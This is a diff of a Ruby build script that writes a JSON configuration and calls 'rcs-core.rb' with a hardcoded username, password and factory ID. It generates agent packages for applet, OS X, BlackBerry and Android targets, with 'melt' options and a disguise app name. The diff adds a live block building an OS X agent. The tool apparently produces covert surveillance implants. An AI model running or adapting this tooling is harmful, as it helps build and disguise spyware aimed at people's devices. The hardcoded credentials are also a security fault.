@@ -5,7 +5,7 @@ require 'json'
 USER = 'alor'
 PASS = 'demorcss'
 FACTORY = 'RCS_0000000001'
-PLATFORM = 'symbian'
+PLATFORM = 'applet'
 
 ###################################################################################################
 =begin
@@ -22,7 +22,7 @@ system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -f #{FACTORY} -b build.json -C 
 =end
 ###################################################################################################
 =begin
-params = {platform: 'wap',
+params = {platform: PLATFORM,
           generate: {platforms: ['blackberry', 'android'],
                      binary: {demo: true, admin: true},
                      melt: {admin: true,
@@ -36,6 +36,19 @@ params = {platform: 'wap',
           }
 
 File.open('build.json', 'w') {|f| f.write params.to_json}
-system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -f #{FACTORY} -b build.json -o wap.zip"
+system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -f #{FACTORY} -b build.json -o #{PLATFORM}.zip"
 =end
+###################################################################################################
+begin
+params = {platform: PLATFORM,
+          generate: {platforms: ['osx'],
+                     binary: {demo: true, admin: false},
+                     melt: {admin: false}
+                    },
+          melt: {appname: 'gino'}
+          }
+
+File.open('build.json', 'w') {|f| f.write params.to_json}
+system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -f #{FACTORY} -b build.json -o #{PLATFORM}.zip"
+end
 ###################################################################################################
